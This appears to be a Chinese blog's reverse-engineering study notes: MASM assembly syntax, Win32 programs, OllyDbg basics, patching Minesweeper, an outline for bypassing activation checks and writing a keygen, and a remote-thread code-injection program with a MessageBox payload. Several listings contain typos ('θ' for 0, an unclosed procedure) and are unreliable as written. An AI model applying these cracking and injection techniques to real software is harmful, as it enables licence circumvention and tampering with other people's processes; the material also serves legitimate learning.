<h5 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h5><h6 id="equ语句"><a href="#equ语句" class="headerlink" title="equ语句"></a>equ语句</h6><ul>
<li>不可以重命名</li>
<li>可用于常量和表达式</li>
<li>可用于字符串</li>
<li>可用于指令名，给指令取别名</li>
<li>可用于类型，给类型取别名</li>
<li>可用于操作数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stack_seg segment stack ;栈会自动加载</span><br><span class="line">	db 256 dup(0cch) ;为栈申请大小</span><br><span class="line">stack_seg ends</span><br><span class="line"></span><br><span class="line">VERSION equ 10</span><br><span class="line">VERSTR equ &quot;hello wrold&quot;</span><br><span class="line">MYMOV equ mov</span><br><span class="line">MYPUSHAX equ push ax</span><br><span class="line"></span><br><span class="line">data_seg segment</span><br><span class="line">	g_wVal dw VERSION</span><br><span class="line">	g_buf db VERSTR</span><br><span class="line">data_seg ends</span><br><span class="line"></span><br><span class="line">code_seg segment</span><br><span class="line">	assume ds:data_seg, ss:stack_seg</span><br><span class="line">START:</span><br><span class="line">	mov ax, data_seg</span><br><span class="line">	mov ds, ax</span><br><span class="line">	</span><br><span class="line">	MYMOV ax, g_wVal</span><br><span class="line">	MYPUSHAX</span><br><span class="line">	</span><br><span class="line">	;程序结束，退出码0</span><br><span class="line">	mov ax, 4C00H</span><br><span class="line">	INT 21H</span><br><span class="line">code_seg ends</span><br><span class="line">end START </span><br></pre></td></tr></table></figure>

<h6 id="x3D-只能整数的equ"><a href="#x3D-只能整数的equ" class="headerlink" title="&#x3D;(只能整数的equ)"></a>&#x3D;(只能整数的equ)</h6><h6 id="macro语句"><a href="#macro语句" class="headerlink" title="macro语句"></a>macro语句</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MYADD MACRO argl, arg2</span><br><span class="line">	mov ax, arg1</span><br><span class="line">	add ax, arg2</span><br><span class="line">ENDM</span><br><span class="line"></span><br><span class="line">MYADD 4, 5</span><br><span class="line">MYADD 7, 8</span><br></pre></td></tr></table></figure>

<p>字符串拼接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shift macro n, reg, d</span><br><span class="line">	mov cl, n</span><br><span class="line">	ro&amp;d reg, cl</span><br><span class="line">	endm</span><br><span class="line"></span><br><span class="line">shift 2,ax,1</span><br><span class="line">shift 3,bx,r</span><br><span class="line">shift 1,cx,1</span><br><span class="line"></span><br><span class="line">.if ax &lt; θ </span><br><span class="line">	mov ax, ax</span><br><span class="line">.elseif ax == 0</span><br><span class="line">	mov bx, bx</span><br><span class="line">.else </span><br><span class="line">	mov cx, cx</span><br><span class="line">.endif</span><br></pre></td></tr></table></figure>

<p>汇编手册中文(asm+masm).chm</p>
<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;test.asm</span><br><span class="line">include tool.inc</span><br><span class="line"></span><br><span class="line">stack_seg segment stack ;栈会自动加载</span><br><span class="line">	db 500H dup(0cch) ;一个段（256）的栈</span><br><span class="line">stack_seg ends</span><br><span class="line"></span><br><span class="line">data_seg segment</span><br><span class="line">	g_buf db 256 dup(0)</span><br><span class="line">	g_wBufLen dw $ - offset g_buf</span><br><span class="line">	g_bufCnt db5 4 dup(0), 0ah, &quot;$&quot;</span><br><span class="line">data_seg ends</span><br><span class="line"></span><br><span class="line">code_seg segment</span><br><span class="line">	assume ds:data_seg, ss:stack_seg</span><br><span class="line">	</span><br><span class="line">GetwordsCount proc far stdcall uses bx pBuff:word</span><br><span class="line">	local @bIsPreSapce:byte</span><br><span class="line">	mov @bIsPreSapce, 0</span><br><span class="line"></span><br><span class="line">	mov ax, 1</span><br><span class="line">	mov bx, pBuff</span><br><span class="line">	;空字符串</span><br><span class="line">	.if byte ptr [bx] == &quot;$&quot;</span><br><span class="line">		xor ax, ax</span><br><span class="line">		ret</span><br><span class="line">	.endif</span><br><span class="line">	</span><br><span class="line">	;非空字符串</span><br><span class="line">	.while byte ptr[bx] != &quot;$&quot;</span><br><span class="line">		.if byte ptr [bx] == &quot; &quot;</span><br><span class="line">			.if @bIsPreSapce == 0</span><br><span class="line">				inc ax</span><br><span class="line">			.endif</span><br><span class="line">			mov @bIsPreSapce, 1</span><br><span class="line">		else</span><br><span class="line">			mov @bIsPreSapce, 0</span><br><span class="line">		.endif</span><br><span class="line">		inc bx</span><br><span class="line">	.endw</span><br><span class="line">	ret</span><br><span class="line">GetwordsCount endp</span><br><span class="line"></span><br><span class="line">START:</span><br><span class="line">	mov ax, data_seg</span><br><span class="line">	mov ds, ax</span><br><span class="line">	</span><br><span class="line">	xor cx, cx</span><br><span class="line">	.while cx &lt; 5</span><br><span class="line">		;获取一行</span><br><span class="line">		invoke GetLine, offset g_buf, g_wBufLen</span><br><span class="line">		</span><br><span class="line">		;获取此行的单词个数</span><br><span class="line">		invoke GetwordsCount, offset g_buf</span><br><span class="line">		</span><br><span class="line">		;个数转字符串</span><br><span class="line">		invoke IntToStr, offset g_bufCnt, ax</span><br><span class="line">		</span><br><span class="line">		;输出个数</span><br><span class="line">		invoke Puts, offset g_bufCnt</span><br><span class="line">		</span><br><span class="line">		inc cx</span><br><span class="line">	.endw</span><br><span class="line">	;程序结束，退出码0</span><br><span class="line">	mov ax, 4C00H</span><br><span class="line">	INT 21H</span><br><span class="line">code_seg ends</span><br><span class="line">end START </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;tool.asm</span><br><span class="line">include tool.inc</span><br><span class="line">data_seg segment</span><br><span class="line">	g_bufHexChar db &quot;0123456789abcdef&quot;</span><br><span class="line">data_seg ends</span><br><span class="line"></span><br><span class="line">code_seg segment</span><br><span class="line"></span><br><span class="line">Puts proc far stdcall uses dx pBuff:word</span><br><span class="line">	mov dx, pBuff</span><br><span class="line">	mov ah, 09h</span><br><span class="line">	int 21h</span><br><span class="line">	</span><br><span class="line">	mov dl, odh</span><br><span class="line">	mov ah, 02h</span><br><span class="line">	int 21H</span><br><span class="line">	</span><br><span class="line">	ret</span><br><span class="line">Puts endp</span><br><span class="line"></span><br><span class="line">IntToStr proc far stdcall uses si bx ds cx pBuff:word, n:word</span><br><span class="line">	local @wCnt:word</span><br><span class="line">	local @wOldDs:word</span><br><span class="line">	</span><br><span class="line">	assumeds:data_seg</span><br><span class="line">	</span><br><span class="line">	mov @wOldDs, ds</span><br><span class="line">	</span><br><span class="line">	mov @wCnt, θ</span><br><span class="line">	.while @wCnt &lt; 4</span><br><span class="line">		mov si, n</span><br><span class="line">		and si, 0f000h</span><br><span class="line">		mov cl, 0ch</span><br><span class="line">		shr si, cl</span><br><span class="line">		</span><br><span class="line">		mov ax, data_seg</span><br><span class="line">		mov ds, ax</span><br><span class="line">		mov bx, offset g_bufHexChar</span><br><span class="line">		mov al, [si + bx]</span><br><span class="line">		</span><br><span class="line">		mov ds, @wOldDs</span><br><span class="line">		mov bx, pBuff</span><br><span class="line">		add bx, @wCnt</span><br><span class="line">		mov [bx], al</span><br><span class="line">		</span><br><span class="line">		mov cl, 4</span><br><span class="line">		shl n, cl</span><br><span class="line">		</span><br><span class="line">		inc @wCnt</span><br><span class="line">	.endw</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GetChar proc far stdcall</span><br><span class="line">	mov ah, 01h</span><br><span class="line">	int 21H</span><br><span class="line">	ret</span><br><span class="line">GetChar ENDP</span><br><span class="line"></span><br><span class="line">GetLine proc far stdcall uses bx PBuff:word, nBufSize:word</span><br><span class="line">	mov bx,pBuff</span><br><span class="line">	invoke Getchar</span><br><span class="line">	.while al != 0dh</span><br><span class="line">		mov [bx],al</span><br><span class="line">		inc bx</span><br><span class="line">		.if bx &gt;= nBufSize</span><br><span class="line">			.break</span><br><span class="line">		.endif</span><br><span class="line">		invoke Getchar</span><br><span class="line">	.endw</span><br><span class="line">	mov byte ptr[bx], &#x27;$&#x27;</span><br><span class="line">	mov ax, bx</span><br><span class="line">	sub ax, pBuff</span><br><span class="line">	ret</span><br><span class="line">GetLine endp</span><br><span class="line"></span><br><span class="line">code_seg ends</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;tool.inc</span><br><span class="line">GetLine proto far stdcall PBuff:word, nBufSize:word</span><br><span class="line">IntToStr proto far stdcall pBuff:word, n:word</span><br><span class="line">Puts proto far stdcall pBuff:word</span><br></pre></td></tr></table></figure>



<p>w32Dasm</p>
<p>机器码是十六进制，winHex打开的默认就是机器码</p>
<ul>
<li>通过地址搜机器码</li>
</ul>
<h1 id="32ASM汇编"><a href="#32ASM汇编" class="headerlink" title="32ASM汇编"></a>32ASM汇编</h1><p>masm32.com</p>
<p>直接指定文件夹安装</p>
<p>把缺少的头文件路径添加在环境变量的include里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ml /c /coff test.asm</span><br><span class="line">link /subsystem:windows test.obj</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;测试代码</span><br><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line">option casemap:NONE</span><br><span class="line">include windows.inc</span><br><span class="line">include user32.inc</span><br><span class="line">includelib user32.lib</span><br><span class="line">.data</span><br><span class="line">	g_szTitle db &quot;hello world&quot;, 0</span><br><span class="line">.code</span><br><span class="line">ENTRY:</span><br><span class="line">	invoke MessageBoxA, NULL, offset g_szTitle, NULL, MB_OK</span><br><span class="line">end ENTRY</span><br></pre></td></tr></table></figure>

<h2 id="与16位ASM区别"><a href="#与16位ASM区别" class="headerlink" title="与16位ASM区别"></a>与16位ASM区别</h2><p>文件头三件套</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.386 ;指令集 Processor</span><br><span class="line">.model flat, stdcall</span><br><span class="line">option casemap:NONE ;标识符是否大小写敏感，none是敏感</span><br></pre></td></tr></table></figure>

<p>msdn宏汇编官网</p>
<p> <a href="https://docs.microsoft.com/en-us/cpp/assembler/masm/directives-reference?view=msvc-160">https://docs.microsoft.com/en-us/cpp/assembler/masm/directives-reference?view=msvc-160</a></p>
<p>32位 &#x3D; 4G</p>
<h3 id="分段"><a href="#分段" class="headerlink" title="分段"></a>分段</h3><p>32位汇编取消了分段，改用内存属性来划分，称作节(section)、内存区或内存块。</p>
<table>
<thead>
<tr>
<th>节</th>
<th>可读</th>
<th>可写</th>
<th>可执行</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>.DATA</td>
<td>true</td>
<td>true</td>
<td>false</td>
<td>初始化的全局变量</td>
</tr>
<tr>
<td>.CONST</td>
<td>true</td>
<td>false</td>
<td>false</td>
<td>只读数据区</td>
</tr>
<tr>
<td>.DATA?</td>
<td>true</td>
<td>true</td>
<td>false</td>
<td>未初始化的全局变量</td>
</tr>
<tr>
<td>CODE</td>
<td>true</td>
<td>false</td>
<td>true</td>
<td>代码</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data</span><br><span class="line">	g_dwVal dd θ</span><br><span class="line">	g_dwVal1 dd 0, 0, 1</span><br><span class="line">.data?</span><br><span class="line">	g_dwVal2 dd ?</span><br><span class="line">.const</span><br><span class="line">	g_dwVa13 dd 9</span><br><span class="line">TestEntry:</span><br><span class="line">	mov ax, ax</span><br><span class="line">end TestEntry</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/55.png" class title="This is an example image">

<p>enter leave</p>
<h3 id="寻址"><a href="#寻址" class="headerlink" title="寻址"></a>寻址</h3><img src="/2024/02/22/Notes-Decompile/56.png" class title="This is an example image">

<p>32位没用中断，调用API</p>
<p>安装MASM</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;编码要用GBK</span><br><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line">option casemap:none</span><br><span class="line"></span><br><span class="line">include windows.inc</span><br><span class="line">include user32.inc</span><br><span class="line">include gdi32.inc</span><br><span class="line">include kernel32.inc</span><br><span class="line"></span><br><span class="line">includelib user32.lib</span><br><span class="line">includelib gdi32.lib</span><br><span class="line">includelib kernel32.lib</span><br><span class="line"></span><br><span class="line">.data </span><br><span class="line">	g_szClassName db &quot;Asmwindowclass&quot;, 0</span><br><span class="line">	g_szTitle     db &quot;32位汇编的第一个窗口&quot;, 0</span><br><span class="line">	g_szTip       db &quot;窗口创建失败&quot;, 0 </span><br><span class="line">.code</span><br><span class="line"></span><br><span class="line">MainWndProc proc hWnd:HWND, nMsg:UINT, wParam:WPARAM, lParam:LPARAM</span><br><span class="line">	.IF nMsg == WM_DESTROY</span><br><span class="line">		invoke PostQuitMessage, 0</span><br><span class="line">	.ENDIF</span><br><span class="line">	invoke DefWindowProc, hWnd, nMsg, wParam, lParam</span><br><span class="line">	ret</span><br><span class="line">MainWndProc endp</span><br><span class="line"></span><br><span class="line">WinMain proc hInstance:HINSTANCE</span><br><span class="line">	local @wc:WNDCLASS</span><br><span class="line">	local @hwnd:HWND</span><br><span class="line">	local @msg:MSG</span><br><span class="line">	</span><br><span class="line">	;设计注册窗口类</span><br><span class="line">	mov @wc.style, CS_HREDRAW or CS_VREDRAW</span><br><span class="line">	mov @wc.lpfnWndProc, offset MainWndProc</span><br><span class="line">	mov @wc.cbClsExtra, 0</span><br><span class="line">	mov @wc.cbWndExtra, 0</span><br><span class="line">	mov eax, hInstance</span><br><span class="line">	mov @wc.hInstance, eax</span><br><span class="line">	</span><br><span class="line">	invoke LoadIcon, NULL, IDI_APPLICATION</span><br><span class="line">	mov @wc.hIcon, eax</span><br><span class="line">	</span><br><span class="line">	invoke LoadCursor, NULL, IDC_ARROW</span><br><span class="line">	mov @wc.hCursor, eax</span><br><span class="line">	</span><br><span class="line">	invoke GetStockObject, WHITE_BRUSH</span><br><span class="line">	mov @wc.hbrBackground, eax</span><br><span class="line">	</span><br><span class="line">	mov @wc.lpszMenuName, NULL</span><br><span class="line">	mov @wc.lpszClassName, offset g_szClassName</span><br><span class="line">	</span><br><span class="line">	invoke RegisterClass, addr @wc</span><br><span class="line">	</span><br><span class="line">	;创建窗口</span><br><span class="line">	invoke CreateWindowEx, NULL, offset g_szClassName,offset g_szTitle, WS_OVERLAPPEDWINDOW,\</span><br><span class="line">	CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,\</span><br><span class="line">	NULL, NULL, hInstance, NULL</span><br><span class="line">	mov @hwnd, eax</span><br><span class="line">	.if eax == NULL</span><br><span class="line">		invoke MessageBox, NULL, offset g_szTip, offset g_szTitle, MB_OK</span><br><span class="line">		ret</span><br><span class="line">	.endif</span><br><span class="line">	</span><br><span class="line">	;显示窗口</span><br><span class="line">	invoke ShowWindow, @hwnd, SW_SHOW</span><br><span class="line">	</span><br><span class="line">	;更新窗口</span><br><span class="line">	invoke UpdateWindow, @hwnd</span><br><span class="line">	</span><br><span class="line">	;消息循环</span><br><span class="line">	.WHILE TRUE</span><br><span class="line">		invoke GetMessage, addr @msg, NULL, 0, 0</span><br><span class="line">		.IF eax == 0</span><br><span class="line">			.break</span><br><span class="line">		.ENDIF</span><br><span class="line">		invoke TranslateMessage, addr @msg</span><br><span class="line">		invoke DispatchMessage, addr @msg</span><br><span class="line">	.ENDW</span><br><span class="line">	;过程函数</span><br><span class="line">	</span><br><span class="line">	ret</span><br><span class="line">WinMain endp</span><br><span class="line"></span><br><span class="line">Cr41Entry:</span><br><span class="line">	invoke GetModuleHandle, NULL</span><br><span class="line">	invoke WinMain, eax</span><br><span class="line">	invoke ExitProcess, 0</span><br><span class="line">end Cr41Entry</span><br></pre></td></tr></table></figure>



<h2 id="OD的简易使用"><a href="#OD的简易使用" class="headerlink" title="OD的简易使用"></a>OD的简易使用</h2><ul>
<li>跳转指定地址，右键-&gt;跳转表达式 &#x2F; ctrl+G &#x2F; 回车 &#x2F; 减号回退  </li>
<li>右键汇编，右选可以撤销</li>
<li>右键快速返回栈顶</li>
<li>F2 断点</li>
<li>F7 单步步入；F8 单步步过；F9 运行；F12 暂停</li>
</ul>
<p>删除OD&#x2F;UDD文件夹下面的文件</p>
<h2 id="资源和联合编译"><a href="#资源和联合编译" class="headerlink" title="资源和联合编译"></a>资源和联合编译</h2><h3 id="C-amp-汇编的相互调用"><a href="#C-amp-汇编的相互调用" class="headerlink" title="C &amp; 汇编的相互调用"></a>C &amp; 汇编的相互调用</h3><p>VC + ml + link + rc</p>
<p>汇编调用C - OBJ</p>
<p>C调用汇编 - OBJ</p>
<p>建议编译成   DLL&#x2F;lib 调用</p>
<p>查看 DLL 内部函数，Dependency walker</p>
<p>汇编在链接时可以导出 DLL 文件，但需要指定对应的 def 文件，不然 DLL 文件中没有函数，不会生成 lib 文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">link /subsystem:windows /Dll /Def:Asmdll.def asmdll.obj</span><br></pre></td></tr></table></figure>



<h3 id="内联汇编（c-x2F-c-写汇编）"><a href="#内联汇编（c-x2F-c-写汇编）" class="headerlink" title="内联汇编（c&#x2F;c++写汇编）"></a>内联汇编（c&#x2F;c++写汇编）</h3><p>内联汇编</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;不能使用宏汇编，比如invoke，.if等等可以使用size，type、length</span><br><span class="line">intnAry[10] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">__asm xor eax, eax</span><br><span class="line">__asm xor ebx, ebx</span><br><span class="line">__asm&#123;</span><br><span class="line">	xor edi, edi</span><br><span class="line">	xor esi, esi</span><br><span class="line">	mov ebx, nRet</span><br><span class="line">	mov nRet, eax</span><br><span class="line">	mov nAry[0], eax</span><br><span class="line">	mov nAry[5], eax</span><br><span class="line">	</span><br><span class="line">	push NULL</span><br><span class="line">	push NULL</span><br><span class="line">	push NULL</span><br><span class="line">	push NULL</span><br><span class="line">	call MessageBox</span><br><span class="line">	;invoke MessageBox,NULL,NULL,NULL,NULL</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">裸函数</span><br><span class="line">__declspec(naked)用于生成裸函数，编译器不会为这个函数生成任何代码，需要自已添加函数进入和返回的代码__LOCAL_SIZE - 内置宏，让编译器计算局部变量的大小</span><br></pre></td></tr></table></figure>



<h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p>定位窗口的过程函数</p>
<p>1、根据窗口相关的 API 去跟踪调用</p>
<p>2、OD自带功能，查看-&gt;窗口-&gt;刷新</p>
<p>3、OD自带功能，查看-&gt;可执行模块(导入函数)-&gt;(搜函数)</p>
<p>条件断点功能</p>
<p>编程窗口程序思路</p>
<p>1、手动 create 窗口的</p>
<p>2、调用 dlgbox</p>
<p>搜索什么关键词要看具体什么应用，用什么语言开发(windows桌面程序)</p>
<p>1、查看-&gt;可执行模块<br>2、选择对应exe，[winmine.exe]右键查看名称，搜索 RegisterClass(导入函数)，右键查看参考(调用)，打断点<br>3、在输入函数内搜索 DIGLOGBOX ，可手动，可右键全部调用处打断点<br>4、执行，根据栈的跳转查看 pWndClass 栈结构内存，查手册可知，(pWndClass)的第二个参数为过程函数，内存跳转到汇编，打上断点，标注为主窗口的过程函数<br>5、pWndClass和RegisterClassW的关系是函数内部调用吗，此处是pWndClass已经调用，RegisterClassW还没调用吗<br>5、执行到过程函数处，可先禁用断点运行后再生效<br>6、寻找默认过程函数，点击Close时触发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">01001BC9   .  55            push    ebp                              ;  主函数默认过程函数</span><br><span class="line">01001BCA   .  8BEC          mov     ebp, esp</span><br><span class="line">01001BCC   .  83EC 40       sub     esp, 40</span><br><span class="line">01001BCF   .  8B55 0C       mov     edx, dword ptr [ebp+C]           ;  获取mMsg</span><br><span class="line">01001BD2   .  8B4D 14       mov     ecx, dword ptr [ebp+14]</span><br><span class="line">01001BD5   .  53            push    ebx</span><br><span class="line">01001BD6   .  56            push    esi</span><br><span class="line">01001BD7   .  33DB          xor     ebx, ebx</span><br><span class="line">01001BD9   .  57            push    edi</span><br><span class="line">01001BDA   .  BE 00020000   mov     esi, 200</span><br><span class="line">01001BDF   .  43            inc     ebx</span><br><span class="line">01001BE0   .  33FF          xor     edi, edi</span><br><span class="line">01001BE2   .  3BD6          cmp     edx, esi                         ;  mMsg跟状态码200比较 move</span><br><span class="line">01001BE4   .  0F87 75030000 ja      01001F5F                         ;  &gt;200</span><br><span class="line">01001BEA   .  0F84 95040000 je      01002085                         ;  =200</span><br><span class="line">01001BF0   .  B8 00010000   mov     eax, 100</span><br><span class="line">01001BF5   .  3BD0          cmp     edx, eax</span><br><span class="line">01001BF7   .  0F87 5C010000 ja      01001D59</span><br><span class="line">01001BFD   .  0F84 97000000 je      01001C9A</span><br><span class="line">01001C03   .  8BC2          mov     eax, edx</span><br><span class="line">01001C05   .  48            dec     eax                              ;  Switch (cases 2..47)</span><br><span class="line">01001C06   .  48            dec     eax</span><br><span class="line">01001C07   .  74 76         je      short 01001C7F</span><br><span class="line">01001C09   .  83E8 04       sub     eax, 4</span><br><span class="line">01001C0C   .  74 57         je      short 01001C65</span><br><span class="line">01001C0E   .  83E8 09       sub     eax, 9</span><br><span class="line">01001C11   .  74 2B         je      short 01001C3E</span><br><span class="line">01001C13   .  83E8 38       sub     eax, 38</span><br><span class="line">01001C16   .  0F85 742E0000 jnz     01004A90                          ; 此处要走默认过程函数</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">01004A90   &gt; \83FA 10       cmp     edx, 10                          ;  Default case of switch 01001C05</span><br><span class="line">01004A93   .^ 0F85 10D7FFFF jnz     010021A9		     ; 01001C16修改前默认跳转 </span><br><span class="line">01004A99   .  6A 01         push    1                     ; /Style = MB_OKCANCEL|MB_APPLMODAL</span><br><span class="line">01004A9B   .  6A 00         push    0                                ; |Title = NULL</span><br><span class="line">01004A9D   .  68 5A4A0001   push    01004A5A         ; |Text = &quot;是&quot;,B7,&quot;裥枰顺?&quot;,A1,&quot;?,A8,&quot;?3?&quot;，此处在01004A5A 编码写中文提示，push 只是作为参数入栈，可数据窗口编辑或汇编编辑</span><br><span class="line">01004AA2   .  FF75 08       push    dword ptr [ebp+8]                ; |hOwner</span><br><span class="line">01004AA5   .  FF15 B8100001 call    dword ptr [&lt;&amp;USER32.MessageBoxW&gt;&gt;; \MessageBoxW</span><br><span class="line">01004AAB   .  83F8 01       cmp     eax, 1</span><br><span class="line">01004AAE   .^ 0F84 F5D6FFFF je      010021A9</span><br><span class="line">01004AB4   .^ E9 02D7FFFF   jmp     010021BB</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">是否需要退出？</span><br><span class="line">\u662f\u5426\u9700\u8981\u9000\u51fa\uff1f</span><br></pre></td></tr></table></figure>



<p>F9运行程序</p>
<p>1、右键-&gt;窗口-&gt;刷新，可直接跟踪 ClassProc，可直接下断点 111 ，这就是过程函数，<strong>消息断点</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">01004A90   &gt; \83FA 10       cmp edx,0x10                             ;  Default case of switch 01001C05</span><br><span class="line">01004A93   .^ 0F85 10D7FFFF jnz winmine3.010021A9</span><br><span class="line">01004A99   .  6A 01         push 0x1                                 ; /Style = MB_OKCANCEL|MB_APPLMODAL</span><br><span class="line">01004A9B   .  6A 00         push 0x0                                 ; |Title = NULL</span><br><span class="line">01004A9D   .  68 5A4A0001   push winmine3.01004A5A                   ; |Text = &quot;是否需要退出?￡í?3?&quot;</span><br><span class="line">01004AA2   .  FF75 08       push dword ptr ss:[ebp+0x8]              ; |hOwner = NULL</span><br><span class="line">01004AA5   .  FF15 B8100001 call dword ptr ds:[&lt;&amp;USER32.MessageBoxW&gt;&gt;; \MessageBoxW</span><br><span class="line">01004AAB   .  83F8 01       cmp eax,0x1</span><br><span class="line">01004AAE   .^ 0F84 F5D6FFFF je winmine3.010021A9</span><br><span class="line">01004AB4   .^ E9 02D7FFFF   jmp winmine3.010021BB</span><br></pre></td></tr></table></figure>



<p>激活码类型：<br>1、点击按钮获取指定弹框内容（bp GetDlgItemTextA、GetDlgItemTextW）<br>2、消息弹框（MessageBoxA、MessageBoxW）<br>执行到返回，跳过系统自带功能<br>直接搜索错误关键词，运行后 Ultra String Reference<br>查看对比String</p>
<p>点击验证，重点是获取点击事件，触发后续的逻辑</p>
<p>两个框校验key值：<br>1、直接搜索错误关键词，运行后 Ultra String Reference<br>2、F4跳到某地址<br>3、找到corrent前一条（00401642）</p>
<p>根据算法逻辑写注册机：<br>1、新建Win32 App</p>
<p>RadASM</p>
<h2 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h2><p>重定位：重新定位代码的变量或地址</p>
<p>代码注入exe文件，申请一块内存</p>
<p>用汇编写一个执行文件，注入到扫描.exe里面，代码注入后地址会变化，要动态计算地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.586</span><br><span class="line">.model flat,stdcall</span><br><span class="line">option casemap:none</span><br><span class="line"></span><br><span class="line">   include windows.inc</span><br><span class="line">   include user32.inc</span><br><span class="line">   include kernel32.inc</span><br><span class="line">   </span><br><span class="line">   includelib user32.lib</span><br><span class="line">   includelib kernel32.lib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">	g_szWinMineCap db &quot;扫雷&quot;, 0 ;这里是窗口名</span><br><span class="line">	g_szUser32 db &quot;user32.dll&quot;, 0</span><br><span class="line">	g_szMessageBox db &quot;MessageBoxA&quot;, 0</span><br><span class="line">.code</span><br><span class="line"></span><br><span class="line">CODE_BEG:</span><br><span class="line">	jmp MSG_CODE</span><br><span class="line">	g_szText db &quot;我注入你了&quot;, 0</span><br><span class="line">	g_szCaption db &quot;温情提示&quot;, 0</span><br><span class="line">	g_pfnMessageBox dd 0</span><br><span class="line"></span><br><span class="line">MSG_CODE:</span><br><span class="line">	int 3</span><br><span class="line">	</span><br><span class="line">	call NEXT  ;把pop ebx指令的地址压栈</span><br><span class="line">NEXT:</span><br><span class="line">	pop ebx   ;pop ebx指令的地址弹栈入ebx</span><br><span class="line">	sub ebx, offset NEXT</span><br><span class="line">	</span><br><span class="line">	push MB_OK</span><br><span class="line">	</span><br><span class="line">	mov eax, offset g_szCaption</span><br><span class="line">	add eax, ebx ;计算变量g_szCaption在新内存中的地址</span><br><span class="line">	push eax</span><br><span class="line">	</span><br><span class="line">	mov eax, offset g_szText</span><br><span class="line">	add eax, ebx ;计算变量e_szText在新内存中的地址</span><br><span class="line">	push eax</span><br><span class="line">	</span><br><span class="line">	push NULL</span><br><span class="line">	</span><br><span class="line">	mov eax, offset g_pfnMessageBox</span><br><span class="line">	add eax, ebx</span><br><span class="line">	call dword ptr [eax]</span><br><span class="line">	</span><br><span class="line">	;call MessageBox</span><br><span class="line">	;invoke MessageBox, NULL, offset g_szText, offset g_szCaption, MB_OK</span><br><span class="line"></span><br><span class="line">CODE_END:</span><br><span class="line">	g_dwCodeSize dd offset CODE_END - offset CODE_BEG</span><br><span class="line"></span><br><span class="line">WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD</span><br><span class="line">	LOCAL @hWndWinmine:HWND</span><br><span class="line">	LOCAL @dwProcId:DWORD</span><br><span class="line">	LOCAL @hProc:HANDLE</span><br><span class="line">	LOCAL @pBuff:LPVOID</span><br><span class="line">	LOCAL @dwBytesWrited:DWORD</span><br><span class="line">	LOCAL @hUser32:HMODULE</span><br><span class="line">	LOCAL @d01dProc:DWORD ;内存权限</span><br><span class="line">	</span><br><span class="line">	invoke LoadLibrary, offset g_szUser32</span><br><span class="line">	mov @hUser32, eax</span><br><span class="line">	</span><br><span class="line">	invoke VirtualProtect, offset g_pfnMessageBox, size g_pfnMessageBox, PAGE_EXECUTE_READWRITE, addr @d01dProc</span><br><span class="line">	</span><br><span class="line">	invoke GetProcAddress, @hUser32, offset g_szMessageBox</span><br><span class="line">	mov g_pfnMessageBox, eax</span><br><span class="line">	</span><br><span class="line">	invoke VirtualProtect, offset g_pfnMessageBox, size g_pfnMessageBox, @d01dProc, addr @d01dProc</span><br><span class="line">	</span><br><span class="line">	invoke FindWindow, NULL, offset g_szWinMineCap</span><br><span class="line">	mov @hWndWinmine, eax</span><br><span class="line">	</span><br><span class="line">	invoke GetWindowThreadProcessId,  @hWndWinmine, addr @dwProcId</span><br><span class="line">	invoke OpenProcess, PROCESS_ALL_ACCESS, FALSE , @dwProcId</span><br><span class="line">	mov @hProc, eax</span><br><span class="line">	</span><br><span class="line">	invoke VirtualAllocEx, @hProc, NULL, 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE</span><br><span class="line">	mov @pBuff, eax</span><br><span class="line"></span><br><span class="line">	invoke WriteProcessMemory, @hProc, @pBuff, offset CODE_BEG, g_dwCodeSize, addr @dwBytesWrited</span><br><span class="line">	</span><br><span class="line">	invoke CreateRemoteThread, @hProc, NULL, 0, @pBuff, NULL, NULL, NULL</span><br><span class="line">	</span><br><span class="line">	xor eax, eax</span><br><span class="line">	ret</span><br><span class="line">WinMain endp</span><br><span class="line"></span><br><span class="line">; ---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start:	</span><br><span class="line">	invoke WinMain, NULL,NULL,NULL, SW_SHOWDEFAULT</span><br><span class="line">	invoke ExitProcess,eax</span><br><span class="line"></span><br><span class="line">end start</span><br><span 